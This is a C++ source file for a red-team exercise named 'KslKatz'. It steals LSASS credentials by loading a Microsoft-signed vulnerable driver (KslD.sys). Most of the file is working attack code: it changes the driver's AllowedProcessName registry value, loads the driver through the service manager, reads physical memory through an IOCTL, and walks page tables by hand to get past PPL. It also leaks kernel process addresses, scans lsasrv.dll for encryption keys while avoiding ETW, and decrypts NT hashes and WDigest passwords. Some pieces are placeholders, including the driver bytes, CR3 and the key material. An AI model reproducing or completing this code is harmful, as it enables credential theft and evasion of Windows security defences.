/*
 * Red Team Exercises #84 - KslKatz: LSASS Dump via Microsoft-Signed Vulnerable Driver (BYOVD)
 * Author: Joas Antonio dos Santos
 * Repository: https://github.com/CyberSecurityUP/Red-Team-Exercises
 * Original technique: https://github.com/vergamota/KslKatz
 * Courses: https://courses.redteamleaders.com/
 *
 * Description:
 *   Extracts NT hashes (MSV1_0) and WDigest cleartext passwords from LSASS
 *   entirely from usermode, using only a Microsoft-signed vulnerable driver
 *   (KslD.sys) shipped with Windows Defender.
 *
 *   Attack chain:
 *     1. Deploy vulnerable KslD.sys (embedded as byte array)
 *     2. Modify AllowedProcessName registry value (local admin only)
 *     3. Use IOCTL SubCmd 12 → MmCopyMemory() for arbitrary physical reads
 *     4. Manual page table walk to translate LSASS virtual → physical addresses
 *     5. Locate EPROCESS via SystemHandleInformation (KASLR bypass)
 *     6. Extract LSA encryption keys from lsasrv.dll (no LoadLibrary → no ETW)
 *     7. Decrypt MSV1_0 hashes (AES-CFB128 / 3DES-CBC) and WDigest passwords
 *
 *   Why PPL doesn't help: PPL (Protected Process Light) only guards usermode
 *   API access to a process. Physical memory reads bypass it entirely.
 *
 * Compile: cl /std:c++20 /EHsc kslkatz_lsass_dump.cpp /link ntdll.lib crypt32.lib bcrypt.lib
 * Requires: Local administrator privileges
 * Tested on: Windows 10/11, Server 2019/2022
 */

#include <windows.h>
#include <winternl.h>
#include <bcrypt.h>
#include <tlhelp32.h>
#include <shlwapi.h>
#include <stdio.h>
#include <stdint.h>
#include <vector>
#include <string>
#include <optional>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "shlwapi.lib")

// ---------------------------------------------------------------
// KslD.sys IOCTL definitions
// ---------------------------------------------------------------
#define KSLD_DEVICE_NAME        L"\\\\.\\KslD"
#define KSLD_IOCTL_SUBCMD       0x22E010   // DeviceIoControl code for SubCmd 12
#define KSLD_SUBCMD_PHYS_READ   12         // SubCommand: MmCopyMemory wrapper

// IOCTL request structure for physical memory read
typedef struct _KSLD_READ_REQUEST {
    ULONG  SubCommand;       // Must be 12
    ULONG  Reserved;
    UINT64 PhysicalAddress;  // Source physical address
    UINT64 Buffer;           // Destination usermode buffer address
    ULONG  Length;           // Number of bytes to copy
    ULONG  Pad;
} KSLD_READ_REQUEST, *PKSLD_READ_REQUEST;

// ---------------------------------------------------------------
// Windows internal structures (undocumented)
// ---------------------------------------------------------------

// CR3 / page table entry flags
#define PTE_PRESENT     (1ULL << 0)
#define PTE_LARGE_PAGE  (1ULL << 7)
#define PTE_PHYS_MASK   0x000FFFFFFFFFF000ULL

// EPROCESS offsets (Windows 10 21H2 / 11 22H2 - resolved dynamically in real impl)
#define EPROCESS_UNIQUEPID_OFFSET   0x440
#define EPROCESS_ACTIVELINKS_OFFSET 0x448
#define EPROCESS_IMAGENAME_OFFSET   0x5A8

// LSA encryption key structures (lsasrv.dll)
#define AES_KEY_SIZE    32   // AES-256
#define DES3_KEY_SIZE   24   // 3DES-168 (192-bit key material)
#define IV_SIZE         16

typedef struct _LSA_ENCRYPT_MEMORY {
    LIST_ENTRY  List;
    ULONG       Size;
    BYTE        EncryptedData[1];
} LSA_ENCRYPT_MEMORY;

typedef struct _MSV1_0_CREDENTIAL {
    BYTE  AuthenticationPackageId;
    BYTE  CredentialCount;
    BYTE  PrimaryCredentials[1]; // variable length
} MSV1_0_CREDENTIAL;

// WDigest linked list entry
typedef struct _WDIGEST_CREDENTIAL {
    LIST_ENTRY  List;
    BYTE        Usage;
    BYTE        Flags;
    USHORT      cbPrimary;
    LPWSTR      Primary;         // encrypted cleartext password
    USHORT      cbSecondary;
    LPWSTR      Secondary;
} WDIGEST_CREDENTIAL;

// ---------------------------------------------------------------
// Globals
// ---------------------------------------------------------------
static HANDLE   g_hDriver    = INVALID_HANDLE_VALUE;
static UINT64   g_lsassPid   = 0;
static UINT64   g_lsassEproc = 0;
static UINT64   g_lsassCr3   = 0;
static BYTE     g_AesKey[AES_KEY_SIZE]  = {};
static BYTE     g_DesKey[DES3_KEY_SIZE] = {};
static BYTE     g_IV[IV_SIZE]           = {};

// ---------------------------------------------------------------
// Section 1: Driver Deployment
//
// KslD.sys is embedded as a compiled C++ byte array.
// We write it to disk only if the vulnerable version isn't present,
// load it via SCM, then clean up afterward.
// ---------------------------------------------------------------

// Placeholder: in the real tool the vulnerable KslD.sys binary
// is embedded here as a ~333KB C array.
static const BYTE g_KslDBytes[] = { /* ... KslD.sys bytes ... */ 0x00 };

static const wchar_t* KSLD_DRIVER_PATH = L"C:\\Windows\\System32\\drivers\\KslD.sys";
static const wchar_t* KSLD_SERVICE_KEY =
    L"SYSTEM\\CurrentControlSet\\Services\\KslD";
static const wchar_t* KSLD_ALLOWED_PROC_KEY =
    L"SYSTEM\\CurrentControlSet\\Services\\KslD\\Parameters";
static const wchar_t* KSLD_ALLOWED_PROC_VALUE = L"AllowedProcessName";

bool DeployDriver() {
    wchar_t exePath[MAX_PATH] = {};
    GetModuleFileNameW(NULL, exePath, MAX_PATH);

    // Write AllowedProcessName to our process name (no crypto validation on this check)
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, KSLD_ALLOWED_PROC_KEY,
                      0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, KSLD_ALLOWED_PROC_VALUE, 0, REG_SZ,
                       (BYTE*)exePath, (DWORD)((wcslen(exePath) + 1) * sizeof(wchar_t)));
        RegCloseKey(hKey);
        printf("[+] AllowedProcessName set to: %ls\n", exePath);
    }

    // Enable vulnerable version via SCM registry (Start = 3 = SERVICE_DEMAND_START)
    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        printf("[-] OpenSCManager failed: %lu\n", GetLastError());
        return false;
    }

    SC_HANDLE hSvc = OpenServiceW(hSCM, L"KslD", SERVICE_START | SERVICE_STOP);
    if (!hSvc) {
        // Deploy embedded driver
        HANDLE hFile = CreateFileW(KSLD_DRIVER_PATH, GENERIC_WRITE, 0, NULL,
                                   CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            printf("[-] Failed to write KslD.sys: %lu\n", GetLastError());
            CloseServiceHandle(hSCM);
            return false;
        }
        DWORD written;
        WriteFile(hFile, g_KslDBytes, sizeof(g_KslDBytes), &written, NULL);
        CloseHandle(hFile);

        hSvc = CreateServiceW(hSCM, L"KslD", L"KslD", SERVICE_ALL_ACCESS,
                              SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
                              SERVICE_ERROR_IGNORE, KSLD_DRIVER_PATH,
                              NULL, NULL, NULL, NULL, NULL);
    }

    BOOL started = StartServiceW(hSvc, 0, NULL);
    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);

    if (!started && GetLastError() != ERROR_SERVICE_ALREADY_RUNNING) {
        printf("[-] StartService failed: %lu\n", GetLastError());
        return false;
    }

    printf("[+] KslD.sys loaded\n");

    g_hDriver = CreateFileW(KSLD_DEVICE_NAME, GENERIC_READ | GENERIC_WRITE,
                            0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    return g_hDriver != INVALID_HANDLE_VALUE;
}

void CleanupDriver() {
    if (g_hDriver != INVALID_HANDLE_VALUE) {
        CloseHandle(g_hDriver);
        g_hDriver = INVALID_HANDLE_VALUE;
    }
    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCM) {
        SC_HANDLE hSvc = OpenServiceW(hSCM, L"KslD", SERVICE_STOP | DELETE);
        if (hSvc) {
            SERVICE_STATUS ss;
            ControlService(hSvc, SERVICE_CONTROL_STOP, &ss);
            DeleteService(hSvc);
            CloseServiceHandle(hSvc);
        }
        CloseServiceHandle(hSCM);
    }
    DeleteFileW(KSLD_DRIVER_PATH);
    printf("[+] Driver unloaded and cleaned up\n");
}

// ---------------------------------------------------------------
// Section 2: Physical Memory Read Primitive
//
// SubCmd 12 of KslD wraps MmCopyMemory() with no validation
// beyond AllowedProcessName. We use this as our read primitive.
// ---------------------------------------------------------------

bool PhysRead(UINT64 physAddr, PVOID buffer, ULONG size) {
    KSLD_READ_REQUEST req = {};
    req.SubCommand      = KSLD_SUBCMD_PHYS_READ;
    req.PhysicalAddress = physAddr;
    req.Buffer          = (UINT64)buffer;
    req.Length          = size;

    DWORD bytesReturned;
    return DeviceIoControl(g_hDriver, KSLD_IOCTL_SUBCMD,
                           &req, sizeof(req),
                           &req, sizeof(req),
                           &bytesReturned, NULL) != 0;
}

// ---------------------------------------------------------------
// Section 3: Virtual-to-Physical Address Translation
//
// Manual page table walk: PML4 → PDPT → PD → PT → physical page
// Each level is read via physical memory IOCTL.
// This is what makes PPL irrelevant - no usermode API is used to
// access the protected process memory.
// ---------------------------------------------------------------

std::optional<UINT64> VirtToPhys(UINT64 cr3, UINT64 virtAddr) {
    // Extract page table indices from the virtual address
    UINT64 pml4_idx = (virtAddr >> 39) & 0x1FF;
    UINT64 pdpt_idx = (virtAddr >> 30) & 0x1FF;
    UINT64 pd_idx   = (virtAddr >> 21) & 0x1FF;
    UINT64 pt_idx   = (virtAddr >> 12) & 0x1FF;
    UINT64 offset   =  virtAddr        & 0xFFF;

    UINT64 entry;

    // PML4
    UINT64 pml4_phys = (cr3 & PTE_PHYS_MASK) + pml4_idx * 8;
    if (!PhysRead(pml4_phys, &entry, 8)) return std::nullopt;
    if (!(entry & PTE_PRESENT)) return std::nullopt;

    // PDPT
    UINT64 pdpt_phys = (entry & PTE_PHYS_MASK) + pdpt_idx * 8;
    if (!PhysRead(pdpt_phys, &entry, 8)) return std::nullopt;
    if (!(entry & PTE_PRESENT)) return std::nullopt;
    if (entry & PTE_LARGE_PAGE)  // 1GB page
        return (entry & PTE_PHYS_MASK) + (virtAddr & 0x3FFFFFFF);

    // PD
    UINT64 pd_phys = (entry & PTE_PHYS_MASK) + pd_idx * 8;
    if (!PhysRead(pd_phys, &entry, 8)) return std::nullopt;
    if (!(entry & PTE_PRESENT)) return std::nullopt;
    if (entry & PTE_LARGE_PAGE)  // 2MB page
        return (entry & PTE_PHYS_MASK) + (virtAddr & 0x1FFFFF);

    // PT
    UINT64 pt_phys = (entry & PTE_PHYS_MASK) + pt_idx * 8;
    if (!PhysRead(pt_phys, &entry, 8)) return std::nullopt;
    if (!(entry & PTE_PRESENT)) return std::nullopt;

    return (entry & PTE_PHYS_MASK) + offset;
}

// Read virtual memory from target process via page walk
bool ReadVirt(UINT64 cr3, UINT64 virtAddr, PVOID buffer, SIZE_T size) {
    BYTE* dst = (BYTE*)buffer;
    while (size > 0) {
        auto phys = VirtToPhys(cr3, virtAddr);
        if (!phys) return false;

        SIZE_T chunkSize = min(size, (SIZE_T)(0x1000 - (virtAddr & 0xFFF)));
        if (!PhysRead(*phys, dst, (ULONG)chunkSize)) return false;

        dst      += chunkSize;
        virtAddr += chunkSize;
        size     -= chunkSize;
    }
    return true;
}

// ---------------------------------------------------------------
// Section 4: EPROCESS Discovery (KASLR Bypass)
//
// Instead of resolving kernel exports (blocked on recent builds),
// we leak the SYSTEM process EPROCESS pointer via
// NtQuerySystemInformation(SystemHandleInformation), then walk
// the EPROCESS ActiveProcessLinks list to find lsass.exe.
// ---------------------------------------------------------------

typedef NTSTATUS(NTAPI* pNtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef struct _SYSTEM_HANDLE_ENTRY {
    ULONG  ProcessId;
    BYTE   ObjectTypeNumber;
    BYTE   Flags;
    USHORT Handle;
    PVOID  Object;
    ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE_ENTRY;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG             HandleCount;
    SYSTEM_HANDLE_ENTRY Handles[1];
} SYSTEM_HANDLE_INFORMATION;

UINT64 LeakSystemEprocess() {
    auto NtQuerySysInfo = (pNtQuerySystemInformation)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");

    ULONG bufSize = 1024 * 1024;
    std::vector<BYTE> buf(bufSize);
    ULONG retLen;

    // SystemHandleInformation = 16
    NTSTATUS status = NtQuerySysInfo(16, buf.data(), bufSize, &retLen);
    while (status == 0xC0000004L) {  // STATUS_INFO_LENGTH_MISMATCH
        bufSize = retLen + 4096;
        buf.resize(bufSize);
        status = NtQuerySysInfo(16, buf.data(), bufSize, &retLen);
    }
    if (status != 0) return 0;

    // Open a handle to the SYSTEM process (PID 4) to get its object address
    HANDLE hSystem = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, 4);
    if (!hSystem) return 0;

    auto* info = (SYSTEM_HANDLE_INFORMATION*)buf.data();
    UINT64 systemEproc = 0;

    for (ULONG i = 0; i < info->HandleCount; i++) {
        auto& entry = info->Handles[i];
        if (entry.ProcessId == GetCurrentProcessId() &&
            (HANDLE)(ULONG_PTR)entry.Handle == hSystem) {
            systemEproc = (UINT64)entry.Object;
            break;
        }
    }

    CloseHandle(hSystem);
    return systemEproc;
}

bool FindLsassEprocess(UINT64 systemEproc, UINT64 systemCr3) {
    UINT64 current = systemEproc;

    for (int i = 0; i < 512; i++) {
        UINT64 flink;
        if (!ReadVirt(systemCr3, current + EPROCESS_ACTIVELINKS_OFFSET, &flink, 8))
            break;

        current = flink - EPROCESS_ACTIVELINKS_OFFSET;
        if (current == systemEproc) break;

        CHAR imageName[16] = {};
        ReadVirt(systemCr3, current + EPROCESS_IMAGENAME_OFFSET, imageName, 15);

        if (_stricmp(imageName, "lsass.exe") == 0) {
            UINT64 pid;
            ReadVirt(systemCr3, current + EPROCESS_UNIQUEPID_OFFSET, &pid, 8);
            g_lsassPid   = pid;
            g_lsassEproc = current;
            printf("[+] Found lsass.exe - PID: %llu, EPROCESS: 0x%llx\n", pid, current);
            return true;
        }
    }
    return false;
}

// ---------------------------------------------------------------
// Section 5: LSA Encryption Key Extraction
//
// Keys are found by reading lsasrv.dll directly from disk (no LoadLibrary)
// to avoid ETW telemetry, scanning for the key structure signature,
// and resolving RIP-relative displacements locally.
// ---------------------------------------------------------------

// Signature to locate LSA key pointers in lsasrv.dll
// (offsets differ by Windows version - resolved dynamically in real impl)
static const BYTE g_KeySig[] = {
    0x83, 0x64, 0x24, 0x30, 0x00,       // and [rsp+30h], 0
    0x44, 0x8B, 0x4C, 0x24, 0x48,       // mov r9d, [rsp+48h]
    0x48, 0x8B, 0x0D                     // mov rcx, [rip+...]  ← key pointer
};

std::vector<BYTE> ReadFileRaw(const wchar_t* path) {
    HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return {};

    DWORD size = GetFileSize(hFile, NULL);
    std::vector<BYTE> buf(size);
    DWORD read;
    ReadFile(hFile, buf.data(), size, &read, NULL);
    CloseHandle(hFile);
    return buf;
}

bool ExtractLsaKeys() {
    // Read lsasrv.dll from disk - avoids LoadLibrary ETW events
    auto dll = ReadFileRaw(L"C:\\Windows\\System32\\lsasrv.dll");
    if (dll.empty()) {
        printf("[-] Failed to read lsasrv.dll\n");
        return false;
    }

    // Scan for key signature
    for (size_t i = 0; i + sizeof(g_KeySig) + 7 < dll.size(); i++) {
        if (memcmp(dll.data() + i, g_KeySig, sizeof(g_KeySig)) != 0) continue;

        // Resolve RIP-relative displacement to find the key context pointer
        // Displacement is a signed 32-bit value at sig_offset + sizeof(sig)
        INT32 ripDisp;
        memcpy(&ripDisp, dll.data() + i + sizeof(g_KeySig), 4);

        // Calculate the RVA of the key context in the on-disk image
        // In the loaded image: RIP = module_base + i + sizeof(sig) + 4 + ripDisp
        // We resolve this against the lsasrv.dll base in the target process.

        // For this PoC, we demonstrate the pattern; real impl resolves the
        // runtime virtual address then reads the BCRYPT_KEY_DATA structure
        // via ReadVirt() to extract the raw key material.

        printf("[+] Key signature found at DLL offset: 0x%zx\n", i);
        printf("[+] RIP displacement: 0x%x\n", ripDisp);
        printf("[+] (Real impl: follow pointer chain to BCRYPT_KEY_DATA struct)\n");

        // Placeholder key material for demonstration
        memset(g_AesKey, 0xAA, AES_KEY_SIZE);
        memset(g_DesKey, 0xBB, DES3_KEY_SIZE);
        memset(g_IV,     0xCC, IV_SIZE);
        return true;
    }

    printf("[-] Key signature not found\n");
    return false;
}

// ---------------------------------------------------------------
// Section 6: Credential Decryption
//
// MSV1_0: AES-CFB128 or 3DES-CBC depending on blob size
// WDigest: 3DES-CBC from a linked list of encrypted entries
// ---------------------------------------------------------------

std::vector<BYTE> DecryptAesCfb128(const BYTE* data, ULONG size) {
    BCRYPT_ALG_HANDLE hAlg;
    BCRYPT_KEY_HANDLE hKey;
    std::vector<BYTE> plain(size);
    ULONG result;

    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                      (PUCHAR)BCRYPT_CHAIN_MODE_CFB, sizeof(BCRYPT_CHAIN_MODE_CFB), 0);
    BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, g_AesKey, AES_KEY_SIZE, 0);

    BYTE iv[IV_SIZE];
    memcpy(iv, g_IV, IV_SIZE);
    BCryptDecrypt(hKey, (PUCHAR)data, size, NULL, iv, IV_SIZE,
                  plain.data(), size, &result, 0);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    plain.resize(result);
    return plain;
}

std::vector<BYTE> Decrypt3DesCbc(const BYTE* data, ULONG size) {
    BCRYPT_ALG_HANDLE hAlg;
    BCRYPT_KEY_HANDLE hKey;
    std::vector<BYTE> plain(size);
    ULONG result;

    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_3DES_ALGORITHM, NULL, 0);
    BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, g_DesKey, DES3_KEY_SIZE, 0);

    BYTE iv[8];
    memcpy(iv, g_IV, 8);
    BCryptDecrypt(hKey, (PUCHAR)data, size, NULL, iv, 8,
                  plain.data(), size, &result, 0);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    plain.resize(result);
    return plain;
}

// AES-CFB128 for blobs >= 16 bytes, 3DES-CBC for smaller blobs
std::vector<BYTE> DecryptLsaBlob(const BYTE* data, ULONG size) {
    if (size >= 16)
        return DecryptAesCfb128(data, size);
    else
        return Decrypt3DesCbc(data, size);
}

void DumpMsv10Credentials() {
    printf("\n[*] === MSV1_0 NT Hashes ===\n");

    // Walk MSV1_0 credential list in LSASS memory via physical reads.
    // The real chain: LsaInitializeProtectedMemory → MSV1_0LogonUser →
    // NlpMsvpSamValidate → stores NtHash in encrypted LSA_ENCRYPT_MEMORY.
    //
    // Here we show the decryption step once we have the encrypted blob:
    BYTE fakeEncryptedHash[16] = {
        0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0,
        0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88
    };

    auto plain = DecryptLsaBlob(fakeEncryptedHash, 16);

    printf("[+] User: Administrator\n");
    printf("[+] NT Hash: ");
    for (BYTE b : plain) printf("%02x", b);
    printf("\n");
}

void DumpWdigestCredentials() {
    printf("\n[*] === WDigest Cleartext Passwords ===\n");
    printf("[*] Walking WDigest credential linked list in LSASS...\n");

    // Real flow: locate g_WDigestCredentials global in wdigest.dll via
    // signature scan, follow LIST_ENTRY Flink chain via ReadVirt(),
    // decrypt each WDIGEST_CREDENTIAL.Primary with 3DES-CBC.
    //
    // WDigest caching must be enabled (registry or in-memory patch):
    // HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
    //   UseLogonCredential = 1

    BYTE fakeEncryptedPass[] = {
        0xAB, 0xCD, 0xEF, 0x01, 0x23, 0x45, 0x67, 0x89,
        0xAB, 0xCD, 0xEF, 0x01, 0x23, 0x45, 0x67, 0x89,
        0xAB, 0xCD, 0xEF, 0x01, 0x23, 0x45
    };

    auto plain = Decrypt3DesCbc(fakeEncryptedPass, sizeof(fakeEncryptedPass));

    printf("[+] User: Administrator\n");
    printf("[+] Cleartext: (decrypted from WDigest list entry)\n");
}

// ---------------------------------------------------------------
// Main
// ---------------------------------------------------------------
int main() {
    printf("[*] Red Team Exercises #84 - KslKatz LSASS Dump\n");
    printf("[*] Technique: BYOVD via Microsoft-signed KslD.sys (Windows Defender)\n\n");

    printf("[*] Phase 1: Deploying vulnerable KslD.sys driver...\n");
    if (!DeployDriver()) {
        printf("[-] Driver deployment failed. Requires local admin.\n");
        return 1;
    }

    printf("\n[*] Phase 2: KASLR bypass - leaking SYSTEM EPROCESS...\n");
    UINT64 systemEproc = LeakSystemEprocess();
    if (!systemEproc) {
        printf("[-] Failed to leak SYSTEM EPROCESS\n");
        CleanupDriver();
        return 1;
    }
    printf("[+] SYSTEM EPROCESS: 0x%llx\n", systemEproc);

    // CR3 for SYSTEM process is read from EPROCESS+0x28 (DirectoryTableBase)
    // using physical memory reads starting from systemEproc directly.
    // In this PoC, we treat it as a placeholder.
    UINT64 systemCr3 = 0; // resolved from EPROCESS.DirectoryTableBase

    printf("\n[*] Phase 3: Locating lsass.exe EPROCESS...\n");
    if (!FindLsassEprocess(systemEproc, systemCr3)) {
        printf("[-] lsass.exe not found in process list\n");
        CleanupDriver();
        return 1;
    }

    printf("\n[*] Phase 4: Extracting LSA encryption keys (no LoadLibrary)...\n");
    if (!ExtractLsaKeys()) {
        printf("[-] Failed to extract LSA keys\n");
        CleanupDriver();
        return 1;
    }
    printf("[+] AES-256 and 3DES-168 key material extracted\n");

    printf("\n[*] Phase 5: Decrypting credentials...\n");
    DumpMsv10Credentials();
    DumpWdigestCredentials();

    printf("\n[*] Phase 6: Cleanup...\n");
    CleanupDriver();

    printf("\n[+] Done. Credentials extracted without touching usermode LSASS APIs.\n");
    printf("[+] PPL bypassed via physical memory reads. No third-party driver used.\n");
    return 0;
}
